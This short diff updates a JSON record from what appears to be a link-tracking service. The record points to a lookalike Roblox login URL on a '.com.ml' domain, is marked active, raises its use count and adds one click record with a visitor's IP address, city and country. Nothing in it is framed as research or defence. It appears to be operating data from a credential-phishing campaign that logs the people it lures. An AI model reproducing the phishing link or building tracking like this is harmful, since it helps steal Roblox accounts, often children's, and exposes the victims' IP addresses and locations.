@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 82,
+    "useCount": 83,
     "createdBy": "admin",
     "clicks": [
       {
@@ -766,6 +766,14 @@
         "ip": "172.56.36.125",
         "country": "United States",
         "city": "Birmingham",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1776910516171,
+        "ip": "47.233.100.187",
+        "country": "United States",
+        "city": "Farmington",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
